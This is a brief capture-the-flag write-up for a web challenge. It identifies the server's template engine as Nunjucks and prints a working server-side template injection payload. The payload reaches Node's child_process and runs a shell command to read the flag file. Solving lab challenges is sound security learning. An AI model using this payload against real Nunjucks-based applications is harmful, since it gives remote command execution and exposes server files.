### Chal Desc:
Watching the sunset with nunjucks to make sure your server side is always protected. The flag is on /app/flag.

URL: http://cybersecweek.ua.pt:2003/

### Soln:  Classic SSTI attack 

![](https://user-images.githubusercontent.com/95117634/171788698-f2f4f6c3-e879-4d4b-8030-c7c711b9f62c.png)

If we apply different commands, we get an error page that tell us it’s nunjucks, so we have to use nunjucks SSTI.  

![](https://user-images.githubusercontent.com/95117634/171788741-8e292e8f-71df-495a-95b7-fd64d8001900.png)

{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /app/flag')")()}}  

![](https://user-images.githubusercontent.com/95117634/171788786-e939f182-dbba-49a8-bf52-3256f4c000e0.png)

